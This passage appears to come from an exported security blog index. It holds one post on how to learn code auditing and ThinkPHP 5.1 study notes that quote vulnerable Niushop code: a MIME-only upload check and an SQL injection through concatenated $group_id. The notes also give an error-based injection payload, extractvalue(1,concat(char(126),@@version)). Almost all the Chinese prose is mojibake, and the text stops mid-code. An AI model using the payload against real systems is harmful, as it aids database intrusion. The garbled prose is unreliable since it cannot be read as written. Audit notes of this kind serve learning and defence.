å­¦ä¹ æŸä¸ªçŸ¥è¯†ç‚¹çš„æ—¶å€™ï¼Œéœ€è¦ä¸€ä¸ªæ˜ç¡®çš„æ„ä¹‰å’Œç›®çš„ æ˜ç¡®æ„ä¹‰æ˜¯ç»™è‡ªå·±å­¦ä¹ ä¸€ä¸ªæ–¹å‘ï¼Œå¹¶åŠ æ·±ç†è§£ã€‚ æ­£å‘çš„ï¼šå…ˆæ€è€ƒæ„ä¹‰ï¼Œåå­¦ä¹ çŸ¥è¯†ã€‚æˆ‘åœ¨å­¦ä¹ ä¸€ä¸ªæ¡†æ¶ï¼Œæˆ‘å¾ˆè¿·èŒ«ï¼Œä¸œè¥¿å¤ªå¤šäº†ï¼Œä¸çŸ¥é“æ€ä¹ˆä¸‹æ‰‹ã€‚æˆ‘å»é—®chat â€œæ¡†æ¶æˆ‘è¦æ€ä¹ˆå­¦ä¹ å‘¢ï¼Œå­¦ä¹ åˆ°å“ªä¸ªæ–¹é¢å’Œç¨‹åº¦æ—¶å°±è¶³ä»¥åº”å¯¹ä»£ç å®¡è®¡æ‰¾å‡ºå®‰å…¨æ¼æ´äº†å‘¢â€ã€‚ç„¶åå®ƒå‘Šè¯‰æˆ‘è¦å­¦ä¹ æ¡†æ¶åŸºç¡€ï¼ˆè·¯ç”±æœºåˆ¶ã€æ§åˆ¶å™¨ã€æ¨¡å‹ã€è§†å›¾ã€ä¸­é—´ä»¶ç­‰ï¼‰ã€è¿›è¡Œå¼€å‘è®­ç»ƒç­‰ã€‚ç„¶åè¿™äº›å°±å˜æˆäº†æˆ‘å­¦ä¹ æ–¹å‘äº†ã€‚ é€†å‘çš„ï¼šå…ˆå­¦ä¹ çŸ¥è¯†ï¼Œåæ‚Ÿå‡ºæ„ä¹‰ã€‚æœ‰çš„æ—¶å€™éšç€å­¦ä¹ çš„æ·±å…¥ï¼Œå°±å¿½ç„¶ç†è§£ä¸€äº›ä¸œè¥¿å­˜åœ¨çš„æ„ä¹‰äº†ã€‚æ¯”å¦‚æŠ€æœ¯æ–‡ç« é‡Œè¯´ï¼Œä»ç¨‹åºå…¥å£å¼€å§‹çœ‹èµ·ã€‚ä½†æˆ‘ä¸æ˜ç™½ä¸ºä»€ä¹ˆï¼Œæˆ‘å°±è®¤ä¸ºä¸ºä»€ä¹ˆä¸ä»è·¯ç”±çœ‹èµ·ã€‚åæ¥æˆ‘çŸ¥é“äº†ï¼Œå“¦ï¼Œå› ä¸ºè·¯ç”±å¯ä»¥æ˜¯å¤šè·¯ç”±ï¼Œç¨‹åºå…¥å£è¿½è¸ªä¸‹å»æ‰èƒ½ç¡®å®šèµ°ä»€ä¹ˆæ–¹å¼çš„è·¯ç”±ã€‚ ä¸€äº›æ–°æ€è·¯çš„å¯å‘ï¼š ğŸ¹:è²Œä¼¼æŠŠæ¯ä¸ªåŸç†éƒ½ææ¸…æ¥šï¼Œè„‘å­é‡Œçš„åŸç†é“¾æ¡å¤šäº†ï¼Œçœ‹åˆ°é—®é¢˜æ½œæ„è¯†å°±èƒ½æƒ³å‡ºæ¥å’‹æäº†ã€‚è„‘å­å˜æˆæµ·å°±æœ‰æ¸”äº† ğŸ°:ä½†è¿™æ˜¯ä¸ªæ‚–è®ºã€‚ä½ å¾—å…ˆå­¦ä¼šä¸€ä¸ªä¸œè¥¿ï¼Œæ‰èƒ½å…»æˆè¿™æ ·çš„æ„è¯† ğŸ¹:ä¸å½±å“å‘€ï¼Œå…ˆç¬¨ç€å­¦ä¸€æ¡è¯æ®é“¾ã€‚æ‡‚å¤šäº†å°±æœ‰æ„è¯†äº†ï¼Œå°±èƒ½èªæ˜çš„å­¦äº† ğŸ°:å…ˆç›²ç›®çš„è·Ÿä¸‹å»ï¼Œç„¶åå†æ…¢æ…¢æ‰¾è·¯å¾„æ˜¯å§ ğŸ¹:ä¹Ÿä¸å¤ªæ˜¯è¿™ç§æ„æ€ ğŸ°:é‚£å°±æ˜¯å•çº¯çš„æ‰©å……çŸ¥è¯†é¢ï¼Ÿ ğŸ¹:æˆ‘æ˜¯ä¸€å±‚å±‚çš„æ‰¾ä¸ºä»€ä¹ˆï¼Œæ‰¾åˆ°åº•ï¼Œç›´åˆ°æœä¸åˆ°äº†ã€‚æˆ‘è¿™ç§åº”è¯¥æ˜¯å…ˆç ´ç‚¹ï¼ˆå¥½åƒï¼Ÿä¸ç¡®å®š ğŸ°:æ˜¯æ¯”è¾ƒå‘æ•£æ€§çš„é‚£ç§å˜›ï¼Ÿå…ˆä¸Šæ‰‹ï¼Œé‡åˆ°ä»€ä¹ˆä¸æ‡‚å¾—ï¼Œå°±å»æœå»å­¦ï¼Œå¾ªç¯å¾€å¤ ğŸ¹:ä¸€ä¸ªåº•å°±æ˜¯ä¸€æ¡é“ã€‚3000å¤§é“é›†é½ï¼Œå°±è§¦ç±»æ—é€šäº†ã€‚å°±æ˜¯æ¯”å¦‚ä½ ä¸çŸ¥é“ä»–ä¸ºä»€ä¹ˆèƒ½æƒ³åˆ°è¿™ä¸ªç‚¹å­ã€‚ä½ å°±å»æŠŠè¿™ä¸ªç‚¹å­çŸ¥è¯†èƒŒåæ¶‰åŠçš„åŸç†è¿‡ç¨‹å…¨éƒ¨ææ˜ç™½ã€‚é‡åˆ°å…¶ä»–çš„é—®é¢˜ï¼Œæœ‰å¯èƒ½é‚£ä¸ªé—®é¢˜çš„åº•å±‚åŸç†ç›¸ä¼¼ï¼Œè¿™æ—¶å€™ä½ å·²ç»æå®šè¿‡ä¸€æ¡é“äº†ï¼Œå°±æœ‰åŠ©äºåé¢é‡åˆ°çš„è¿™ä¸ªé—®é¢˜çš„æ½œæ„è¯†ç†è§£ ğŸ°:å“¦å“¦ï¼Œå¥½åƒæ˜ç™½ä½ çš„æ„æ€äº†ï¼Œä¸€ä¸ªç‚¹å­ï¼Œå°±iæ˜¯ä¸€ä¸ªç»“æœã€‚ä½ æƒ³è¦è‡ªå·±å¾—å‡ºè¿™ä¸ªç»“æœï¼Œå°±éœ€è¦æŠŠè¿™ä¸ªè¿‡ç¨‹å­¦ä¼šã€‚æ”’å¤šäº†è¿™æ ·çš„è¿‡ç¨‹ï¼Œè‡ªå·±å°±èƒ½å¾—å‡ºå¾ˆå¤šè¿™æ ·çš„ç»“æœäº† ğŸ¹:å—¯å—¯ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“è¿™æ ·å¯¹ä¸å¯¹ã€‚åæ­£æˆ‘ç°åœ¨æ— è®ºçœ‹åˆ°ä»€ä¹ˆæ–‡ç« çŸ¥è¯†éƒ½ä¸ä¼šè§‰å¾—ç¦»è°±äº†ï¼Œæ½œæ„è¯†éƒ½è§‰å¾—åœ¨æ„æ–™ä¹‹ä¸­ é™¤éæ˜¯ç‰¹åˆ«ç¦»è°±çš„ï¼ˆæ¯”å¦‚æ™®äº¬è·³é’¢ç®¡èˆ","categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"æ€è·¯","slug":"æ€è·¯","permalink":"https://gryffinbit.top/tags/%E6%80%9D%E8%B7%AF/"}],"author":"Gryffinbit"},{"title":"thinkphp5.1 æ¡†æ¶å­¦ä¹ ","slug":"thinkphp5-1-æ¡†æ¶å­¦ä¹ ","date":"2024-07-07T08:01:43.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2024/07/07/thinkphp5-1-æ¡†æ¶å­¦ä¹ /","permalink":"https://gryffinbit.top/2024/07/07/thinkphp5-1-%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"0x00 PHPå‡½æ•° è®°å½•ä¸€ä¸‹å­¦ä¹ çš„è¿‡ç¨‹ï¼ŒåªæŒ‘äº†ä¸€äº›è‡ªå·±ä¸æ‡‚çš„å’Œå¾ˆé‡è¦çš„åœ°æ–¹ï¼Œé›¶æ•£çš„æ‹¿å‡ºæ¥è¯¦ç»†çš„å†™å†™ åŸºäºThinkPHPçš„ä»£ç å®¡è®¡â€”â€”Niushop (qq.com) php å†…ç½®å‡½æ•°ï¼Œæ–°å»ºæ–‡ä»¶å¹¶ç¼–è¾‘æƒé™ 1234if (! file_exists($this-&gt;reset_file_path)) &#123; $mode = intval(&#x27;0777&#x27;, 8); // å…«è¿›åˆ¶ï¼Œ777æƒé™ mkdir($this-&gt;reset_file_path, $mode, true);&#125; æ–‡ä»¶ä¸Šä¼ æ£€æµ‹ä¸ä¸¥è°¨ åªè§„å®šäº†ä¸Šä¼ çš„æ ¼å¼ï¼Œæ²¡æœ‰è§„å®šåç¼€ 1234567891011121314private function validationFile()&#123; $flag = true; switch ($this-&gt;file_path) &#123; case UPLOAD_AVATOR: // ç”¨æˆ·å¤´åƒ if (($this-&gt;file_type != &quot;image/gif&quot; &amp;&amp; $this-&gt;file_type != &quot;image/png&quot; &amp;&amp; $this-&gt;file_type != &quot;image/jpeg&quot; &amp;&amp; $this-&gt;file_type != &quot;image/jpg&quot;) || $this-&gt;file_size &gt; 1000000) &#123; $this-&gt;return[&#x27;message&#x27;] = &#x27;æ–‡ä»¶ä¸Šä¼ å¤±è´¥,è¯·æ£€æŸ¥æ‚¨ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹,æ–‡ä»¶å¤§å°ä¸èƒ½è¶…è¿‡1MB&#x27;; $flag = false; &#125; break; &#125; return $flag;&#125; sqlæ³¨å…¥ 12345678910111213141516171819202122232425public function promotionZone()&#123; $platform = new Platform(); $goods = new GoodsService(); // å“ç‰Œä¸“åŒºå¹¿å‘Šä½ $brand_adv = $platform-&gt;getPlatformAdvPositionDetailByApKeyword(&quot;goodsLabel&quot;); $this-&gt;assign(&#x27;brand_adv&#x27;, $brand_adv); if (request()-&gt;isAjax()) &#123; $page_index = request()-&gt;get(&#x27;page&#x27;, &#x27;1&#x27;); $group_id = request()-&gt;get(&quot;group_id&quot;, &quot;&quot;); $this-&gt;goods = new GoodsService(); $condition = &quot;&quot;; if (! empty($group_id)) &#123; $condition = &quot;FIND_IN_SET(&quot; . $group_id . &quot;,ng.group_id_array)&quot;; &#125; else &#123; $condition[&#x27;ng.group_id_array&#x27;] = array( &#x27;neq&#x27;, &#x27;&#x27; ); &#125; $goods_list = $this-&gt;goods-&gt;getGoodsList($page_index, PAGESIZE, $condition, &quot;&quot;, $group_id); return $goods_list; &#125;&#125; 1$condition = &quot;FIND_IN_SET(&quot; . $group_id . &quot;,ng.group_id_array)&quot;; æ²¡æœ‰å¯¹$group_idçš„å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡getçš„æ–¹å¼å¯¹è¯¥å†…å®¹è¿›è¡Œä¼ å‚ï¼Œæ‰€ä»¥å°±å­˜åœ¨sqlæ³¨å…¥ã€‚ å½“sqlæ³¨å…¥å¯ä»¥é€šè¿‡æŠ¥é”™æ¥è·å¾—å›æ˜¾çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡sqlè¯­å¥extractvalue(1,concat(char(126),@@version)) è¿›è¡Œç‰ˆæœ¬æŸ¥è¯¢ã€‚ EXTRACTVALUE() å‡½æ•°åœ¨MySQLä¸­ç”¨äºä»XMLæ–‡æ¡£ç‰‡æ®µä¸­æå–å€¼ã€‚å®ƒé€šå¸¸æ¥å—ä¸¤ä¸ªå‚æ•°ï¼šç¬¬ä¸€ä¸ªæ˜¯XMLå­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªæ˜¯XPathè¡¨è¾¾å¼ï¼Œç”¨äºå®šä½XMLä¸­çš„æ•°æ®ã€‚ç„¶è€Œï¼Œåœ¨SQLæ³¨å…¥æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ»¥ç”¨è¿™ä¸ªå‡½æ•°ä»¥å¼•å‘é”™è¯¯æ¶ˆæ¯ï¼Œä»è€Œæ³„éœ²æ•°æ®åº“çš„ä¿¡æ¯ã€‚ CONCAT() å‡½æ•°ç”¨äºè¿æ¥ä¸¤ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒè¢«ç”¨æ¥æ„å»ºä¸€ä¸ªåŒ…å«æ•æ„Ÿæ•°æ®ï¼ˆå¦‚æ•°æ®åº“ç‰ˆæœ¬ï¼‰çš„å­—ç¬¦ä¸²ã€‚ 0x01 LoaderLoader ç±»åœ¨ThinkPHP 5.1ä¸­æ‰®æ¼”äº†é‡è¦çš„è§’è‰²ï¼Œé€šè¿‡æä¾›ç®€æ´çš„APIæ¥åŠ è½½åº”ç”¨çš„å„ç§ç»„ä»¶. Loader ç±»é€šè¿‡æ³¨å†Œè‡ªå·±ä¸ºè‡ªåŠ¨åŠ è½½å‡½æ•°ï¼Œå¸®åŠ©PHPè§£æå¹¶æ‰¾åˆ°æ­£ç¡®çš„ç±»æ–‡ä»¶ã€‚ thinkphpé€šè¿‡start.phpå¼•å…¥çš„base.phpå®šä¹‰æ–‡ä»¶å¤¹ç­‰ç³»ç»Ÿå¸¸é‡ï¼Œç„¶åå¼•å…¥Loaderæ¥åŠ è½½ä»»æ„ç±»ï¼Œé€šè¿‡è‡ªåŠ¨åŠ è½½ä½¿ç”¨Errorç±»æ³¨å†Œé”™è¯¯å¤„ç†ï¼Œä»¥åŠConfigç±»åŠ è½½æ¨¡å¼é…ç½®æ–‡ä»¶thinkphp/convention.phpã€‚åšå¥½ä¸€ç³»åˆ—å‡†å¤‡å·¥ä½œä¹‹åï¼Œæ‰§è¡Œåº”ç”¨ App::run()-&gt;send() ä¾‹å¦‚åŠ è½½æ§åˆ¶å™¨ï¼š æ§åˆ¶å™¨é€šå¸¸åœ¨è·¯ç”±è°ƒç”¨æ—¶è‡ªåŠ¨åŠ è½½ï¼Œä½†å¦‚æœéœ€è¦æ‰‹åŠ¨åŠ è½½æ§åˆ¶å™¨ï¼Œå¯ä»¥ä½¿ç”¨ Loader::controller æ–¹æ³•ã€‚ 12$userController = Loader::controller(&#x27;User&#x27;, &#x27;controller\\index&#x27;);// è¿™ä¼šåŠ è½½ app\\index\\controller\\User æ§åˆ¶å™¨ 0x02 hookâ€œé’©å­â€ï¼ˆHookï¼‰å…è®¸å¼€å‘è€…åœ¨åº”ç”¨ç¨‹åºçš„ç‰¹å®šç‚¹æ’å…¥è‡ªå·±çš„ä»£ç ï¼Œè€Œä¸éœ€è¦ä¿®æ”¹ä¸»ä½“ç¨‹åºã€‚è¿™ç§æœºåˆ¶ç‰¹åˆ«åœ¨æ’ä»¶æˆ–æ‰©å±•åŠŸèƒ½å¼€å‘ä¸­éå¸¸é‡è¦ï¼Œå› ä¸ºå®ƒå…è®¸å¼€å‘è€…æ‰©å±•æˆ–ä¿®æ”¹åº”ç”¨ç¨‹åºçš„è¡Œä¸ºï¼Œè€Œä¸ç›´æ¥å½±å“ä¸»ç¨‹åºçš„ç¨³å®šæ€§å’Œå®Œæ•´æ€§ã€‚é’©å­æœ¬èº«é€šå¸¸ä¸è´Ÿè´£éªŒè¯é€»è¾‘æœ¬èº«ï¼Œè€Œæ˜¯æä¾›ä¸€ä¸ªæ’å…¥è‡ªå®šä¹‰ä»£ç å’Œæ‰©å±•åŠŸèƒ½çš„ç‚¹ã€‚ é’©å­å¤§ä½“å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼š åŠ¨ä½œé’©å­ï¼ˆAction Hooksï¼‰ï¼š è¿™ç§é’©å­å…è®¸ä½ åœ¨ç¨‹åºçš„ç‰¹å®šæ—¶åˆ»æ‰§è¡Œä¸€ä¸ªåŠ¨ä½œã€‚ä¾‹å¦‚ï¼Œåœ¨ç”¨æˆ·æ³¨å†Œåå‘é€æ¬¢è¿é‚®ä»¶å°±æ˜¯é€šè¿‡åŠ¨ä½œé’©å­å®ç°çš„ã€‚ åŠ¨ä½œé’©å­é€šå¸¸ä¸è¿”å›å€¼ï¼Œå®ƒä»¬ä¸»è¦ç”¨äºè§¦å‘äº‹ä»¶æˆ–æ“ä½œã€‚ è¿‡æ»¤é’©å­ï¼ˆFilter Hooksï¼‰ï¼š è¿‡æ»¤é’©å­å…è®¸ä½ ä¿®æ”¹æ•°æ®ã€‚ä¾‹å¦‚ï¼ŒWordPressä¸­çš„the_contenté’©å­å…è®¸ä½ ä¿®æ”¹æ–‡ç« å†…å®¹ï¼Œå¦‚æ·»åŠ é¢å¤–çš„HTMLï¼Œæˆ–æ˜¯åŠ¨æ€ä¿®æ”¹æ–‡æœ¬ã€‚ è¿™ç±»é’©å­æ¥æ”¶ä¸€ä¸ªå€¼ä½œä¸ºè¾“å…¥ï¼Œç»è¿‡å¤„ç†åè¿”å›æ–°çš„å€¼ã€‚ é’©å­çš„å·¥ä½œæµç¨‹é€šå¸¸åŒ…æ‹¬ä¸‰ä¸ªåŸºæœ¬æ­¥éª¤ï¼š å®šä¹‰é’©å­ä½ç½®ï¼š å¼€å‘ä¸»ç¨‹åºçš„å¼€å‘è€…åœ¨è½¯ä»¶çš„å…³é”®ä½ç½®æ”¾ç½®é’©å­ã€‚è¿™äº›ä½ç½®é€šå¸¸æ˜¯æ‰§è¡Œæ“ä½œæˆ–è¿”å›æ•°æ®ä¹‹å‰çš„ç‚¹ï¼Œä¾‹å¦‚æ•°æ®ä¿å­˜åˆ°æ•°æ®åº“ä¹‹å‰ã€‚ åœ¨PHPæ¡†æ¶ä¸­ï¼Œè¿™é€šå¸¸é€šè¿‡è°ƒç”¨é¢„ç•™çš„å‡½æ•°æˆ–æ–¹æ³•æ¥å®ç°ï¼Œå¦‚è°ƒç”¨do_action()æˆ–apply_filters()ã€‚ é™„åŠ å‡½æ•°ï¼ˆHooking Functionsï¼‰ï¼š å¤–éƒ¨å¼€å‘è€…æˆ–æ’ä»¶å¼€å‘è€…ç¼–å†™è‡ªå®šä¹‰å‡½æ•°æ¥â€œæŒ‚é’©â€åˆ°è¿™äº›é¢„å®šä¹‰çš„é’©å­ä¸Šã€‚è¿™é€šå¸¸é€šè¿‡è°ƒç”¨å¦‚add_action()æˆ–add_filter()çš„å‡½æ•°æ¥å®ç°ï¼Œè¿™äº›å‡½æ•°è®©ä½ æŒ‡å®šå½“é’©å­è¢«è§¦å‘æ—¶åº”è¯¥æ‰§è¡Œå“ªä¸ªå‡½æ•°ã€‚ æ‰§è¡Œé’©å­ï¼š å½“åˆ°è¾¾ç¨‹åºä¸­å®šä¹‰é’©å­çš„ä½ç½®æ—¶ï¼Œæ‰€æœ‰é™„åŠ åˆ°è¯¥é’©å­çš„å‡½æ•°éƒ½ä¼šæŒ‰ç…§æŒ‡å®šçš„é¡ºåºæ‰§è¡Œã€‚è¿™å…è®¸åŠ¨æ€åœ°ä¿®æ”¹ç¨‹åºçš„è¡Œä¸ºæˆ–æ•°æ®ã€‚ ä¸¾ä¸ªä¾‹å­ æ ‡å‡†ç™»å½•æµç¨‹ï¼ˆæ— é’©å­ï¼‰ï¼š ç”¨æˆ·æäº¤ç”¨æˆ·åå’Œå¯†ç ï¼šç”¨æˆ·åœ¨ç™»å½•è¡¨å•å¡«å†™ä¿¡æ¯åæäº¤ã€‚ ç³»ç»ŸéªŒè¯å‡­æ®ï¼šç³»ç»Ÿå°†ç”¨æˆ·æäº¤çš„ä¿¡æ¯ä¸æ•°æ®åº“ä¸­çš„æ•°æ®è¿›è¡Œæ¯”å¯¹ã€‚ å¤„ç†éªŒè¯ç»“æœ å¦‚æœéªŒè¯æˆåŠŸï¼ˆå³ç”¨æˆ·åå’Œå¯†ç åŒ¹é…ï¼‰ï¼Œç”¨æˆ·è¢«è®¤ä¸ºå·²æˆåŠŸç™»å½•ï¼Œç³»ç»Ÿå¯èƒ½ä¼šè·³è½¬åˆ°ä¸»é¡µæˆ–ç”¨æˆ·ä»ªè¡¨æ¿ã€‚ å¦‚æœéªŒè¯å¤±è´¥ï¼Œå¯èƒ½ä¼šæ˜¾ç¤ºä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ã€‚ å¼•å…¥é’©å­çš„ç™»å½•æµç¨‹ï¼š åœ¨æœ‰é’©å­çš„æƒ…å†µä¸‹ï¼Œæµç¨‹å¯èƒ½ä¼šåŒ…å«ä¸€äº›é¢å¤–çš„æ­¥éª¤ï¼Œå…è®¸è‡ªå®šä¹‰æˆ–æ‰©å±•åŠŸèƒ½ï¼š ç”¨æˆ·æäº¤ç”¨æˆ·åå’Œå¯†ç ã€‚ å‰ç½®é’©å­ï¼šåœ¨éªŒè¯ç”¨æˆ·å‡­æ®ä¹‹å‰æ‰§è¡Œã€‚è¿™å¯ä»¥ç”¨äºè®°å½•å°è¯•ç™»å½•çš„æ—¥å¿—ã€æ£€æŸ¥è´¦å·æ˜¯å¦è¢«é”å®šç­‰é¢„å¤„ç†æ“ä½œã€‚ ç³»ç»ŸéªŒè¯å‡­æ®ï¼šä¸æ ‡å‡†æµç¨‹ç›¸åŒã€‚ åç½®é’©å­ å¦‚æœå‡­æ®æ­£ç¡®ï¼Œç™»å½•æˆåŠŸé’©å­å¯ä»¥è§¦å‘ï¼Œä¾‹å¦‚ç”¨äºè§¦å‘æ¬¢è¿é‚®ä»¶çš„å‘é€ã€è®°å½•ç™»å½•æˆåŠŸçš„æ—¥å¿—ã€åŠ è½½ç”¨æˆ·çš„ä¸ªæ€§åŒ–è®¾ç½®ç­‰ã€‚ å¦‚æœå‡­æ®ä¸æ­£ç¡®ï¼Œç™»å½•å¤±è´¥é’©å­å¯ä»¥è§¦å‘ï¼Œä¾‹å¦‚ç”¨äºè®°å½•ç™»å½•å¤±è´¥å°è¯•ã€å¢åŠ è´¦æˆ·çš„å®‰å…¨çº§åˆ«ç­‰ã€‚ åœ¨éªŒè¯ç™»å½•è¿‡ç¨‹ä¸­ï¼Œåˆ©ç”¨é’©å­æ‰§è¡Œé¢å¤–çš„æ“ä½œæˆ–æ£€æŸ¥ã€‚é’©å­æœ¬èº«é€šå¸¸ä¸è´Ÿè´£éªŒè¯é€»è¾‘æœ¬èº«ï¼Œè€Œæ˜¯æä¾›ä¸€ä¸ªæ’å…¥è‡ªå®šä¹‰ä»£ç å’Œæ‰©å±•åŠŸèƒ½çš„ç‚¹ã€‚ 0x03 input å‡½æ•°è·å–è¯·æ±‚å‚æ•°åœ¨ThinkPHPæ¡†æ¶ä¸­ï¼Œinput åŠ©æ‰‹å‡½æ•°æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„åŠŸèƒ½ï¼Œå®ƒç”¨äºè·å–å®¢æˆ·ç«¯ä¼ é€’æ¥çš„æ•°æ®ï¼ˆå¦‚GETã€POSTç­‰è¯·æ±‚æ•°æ®ï¼‰ã€‚è¿™ä¸ªåŠ©æ‰‹å‡½æ•°ä¸»è¦ç”¨äºç®€åŒ–å’ŒåŠ å¼ºæ•°æ®è·å–å’ŒéªŒè¯çš„è¿‡ç¨‹ã€‚ è·å–æ•°æ®ï¼š å¯ä»¥æŒ‡å®šè¦è·å–çš„æ•°æ®ç±»å‹å’Œå˜é‡åã€‚å¦‚æœä¸æŒ‡å®šï¼Œé»˜è®¤ä¸º input(&#39;param.&#39;)ï¼Œå®ƒå°†ä»é»˜è®¤çš„è¯·æ±‚å˜é‡ä¸­è·å–æ•°æ®ã€‚ 12$name = input(&#x27;get.name&#x27;); // è·å–GETè¯·æ±‚ä¸­çš„nameå˜é‡$age = input(&#x27;post.age&#x27;); // è·å–POSTè¯·æ±‚ä¸­çš„ageå˜é‡ åˆ¤æ–­æœ‰æ²¡æœ‰ä¼ é€’æŸä¸ªå‚æ•°å¯ä»¥ç”¨ 12input(&#x27;?get.id&#x27;);input(&#x27;?post.name&#x27;); æ•°æ®è¿‡æ»¤å’ŒéªŒè¯ï¼š input å‡½æ•°å…è®¸æ‚¨æŒ‡å®šè¿‡æ»¤å‡½æ•°æˆ–è€…éªŒè¯è§„åˆ™ã€‚è¿™æ˜¯é€šè¿‡ä¼ é€’ç¬¬äºŒä¸ªå‚æ•°æ¥å®ç°çš„ï¼Œå¯ä»¥æ˜¯PHPçš„å†…ç½®è¿‡æ»¤å‡½æ•°ï¼Œä¹Ÿå¯ä»¥æ˜¯è‡ªå®šä¹‰çš„å›è°ƒå‡½æ•°ã€‚ 1$email = input(&#x27;post.email&#x27;, &#x27;&#x27;, &#x27;trim,strtolower,email&#x27;); // ä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨ è®¾ç½®é»˜è®¤å€¼ï¼š å¦‚æœæŒ‡å®šçš„å˜é‡ä¸å­˜åœ¨ï¼Œå¯ä»¥é€šè¿‡ä¼ é€’ç¬¬ä¸‰ä¸ªå‚æ•°æ¥è®¾ç½®ä¸€ä¸ªé»˜è®¤å€¼ã€‚ 1$status = input(&#x27;post.status&#x27;, 0); // å¦‚æœpostä¸­æ²¡æœ‰statuså˜é‡ï¼Œåˆ™é»˜è®¤ä¸º0 è·å–æ•´ä¸ªæ•°ç»„ï¼š å¦‚æœæƒ³è·å–æ•´ä¸ªGETæˆ–POSTæ•°ç»„ï¼Œå¯ä»¥çœç•¥å˜é‡åã€‚ 12$allGetVars = input(&#x27;get.&#x27;); // è·å–æ‰€æœ‰GETå˜é‡$allPostVars = input(&#x27;post.&#x27;); // è·å–æ‰€æœ‰POSTå˜é‡ å‡½æ•°æ®µè§£æthinkphp/helper.php:121 123456789101112131415161718192021222324function input($key = &#x27;&#x27;, $default = null, $filter = &#x27;&#x27;)&#123; if (0 === strpos($key, &#x27;?&#x27;)) &#123; $key = substr($key, 1); $has = true; &#125; if ($pos = strpos($key, &#x27;.&#x27;)) &#123; // æŒ‡å®šå‚æ•°æ¥æº list($method, $key) = explode(&#x27;.&#x27;, $key, 2); if (!in_array($method, [&#x27;get&#x27;, &#x27;post&#x27;, &#x27;put&#x27;, &#x27;patch&#x27;, &#x27;delete&#x27;, &#x27;route&#x27;, &#x27;param&#x27;, &#x27;request&#x27;, &#x27;session&#x27;, &#x27;cookie&#x27;, &#x27;server&#x27;, &#x27;env&#x27;, &#x27;path&#x27;, &#x27;file&#x27;])) &#123; $key = $method . &#x27;.&#x27; . $key; $method = &#x27;param&#x27;; &#125; &#125; else &#123; // é»˜è®¤ä¸ºè‡ªåŠ¨åˆ¤æ–­ $method = &#x27;param&#x27;; &#125; if (isset($has)) &#123; return request()-&gt;has($key, $method, $default); &#125; else &#123; return request()-&gt;$method($key, $default, $filter); &#125;&#125; $key: å¯é€‰å‚æ•°ï¼Œç”¨äºæŒ‡å®šè¦è·å–çš„æ•°æ®çš„é”®ï¼ˆkeyï¼‰ï¼ŒåŒæ—¶å¯ä»¥é€šè¿‡åœ¨é”®å‰åŠ å‰ç¼€æ¥æŒ‡å®šæ•°æ®æ¥æºï¼ˆä¾‹å¦‚ post.name è¡¨ç¤ºä» POST æ•°æ®è·å– name é”®çš„å€¼ï¼‰ã€‚å¦‚æœé”®ä»¥ ? å¼€å¤´ï¼Œè¡¨ç¤ºæ£€æŸ¥è¯¥é”®æ˜¯å¦å­˜åœ¨ã€‚ $default: å¯é€‰å‚æ•°ï¼Œå¦‚æœæŒ‡å®šçš„é”®ä¸å­˜åœ¨ï¼Œåˆ™è¿”å›è¿™ä¸ªé»˜è®¤å€¼ã€‚ $filter: å¯é€‰å‚æ•°ï¼Œç”¨äºæŒ‡å®šåº”ç”¨äºæ•°æ®çš„è¿‡æ»¤å™¨ã€‚ æ£€æŸ¥é”®æ˜¯å¦å­˜åœ¨ 1234if (0 === strpos($key, &#x27;?&#x27;)) &#123; $key = substr($key, 1); $has = true;&#125; è¿™æ®µä»£ç æ£€æŸ¥ $key æ˜¯å¦ä»¥ ? å¼€å§‹ã€‚å¦‚æœæ˜¯ï¼Œç§»é™¤ ? å¹¶è®¾ç½®ä¸€ä¸ªæ ‡è®° $hasï¼Œè¡¨ç¤ºåç»­æ“ä½œåº”æ£€æŸ¥é”®æ˜¯å¦å­˜åœ¨è€Œéç›´æ¥è·å–å€¼ã€‚ è§£ææ•°æ®æ¥æº 123456789if ($pos = strpos($key, &#x27;.&#x27;)) &#123; list($method, $key) = explode(&#x27;.&#x27;, $key, 2); if (!in_array($method, [&#x27;get&#x27;, &#x27;post&#x27;, &#x27;put&#x27;, &#x27;patch&#x27;, &#x27;delete&#x27;, &#x27;route&#x27;, &#x27;param&#x27;, &#x27;request&#x27;, &#x27;session&#x27;, &#x27;cookie&#x27;, &#x27;server&#x27;, &#x27;env&#x27;, &#x27;path&#x27;, &#x27;file&#x27;])) &#123; $key = $method . &#x27;.&#x27; . $key; $method = &#x27;param&#x27;; &#125;&#125; else &#123; $method = &#x27;param&#x27;;&#125; è¿™æ®µä»£ç æ£€æŸ¥ $key ä¸­æ˜¯å¦åŒ…å«ç‚¹ (.)ï¼Œç”¨æ¥åˆ†éš”æ•°æ®æ¥æºå’Œå®é™…çš„é”®åã€‚ä¾‹å¦‚ post.nameã€‚ å¦‚æœå­˜åœ¨ç‚¹åˆ†éš”ç¬¦ï¼Œexplode å‡½æ•°ç”¨æ¥åˆ†ç¦»æ•°æ®æ¥æºå’Œé”®åã€‚ æ£€æŸ¥åˆ†ç¦»å‡ºçš„æ¥æºæ˜¯å¦åœ¨é¢„å®šä¹‰çš„æ¥æºåˆ—è¡¨ä¸­ï¼Œå¦‚æœä¸åœ¨ï¼Œåˆ™é‡è®¾ $method ä¸º paramï¼ˆè¡¨ç¤ºè‡ªåŠ¨åˆ¤æ–­æ¥æºï¼‰ï¼Œå¹¶å°†åŸå§‹çš„æ–¹æ³•å’Œé”®é‡æ–°ç»„åˆæˆ $keyã€‚ è¿”å›æ•°æ® 12345if (isset($has)) &#123; return request()-&gt;has($key, $method, 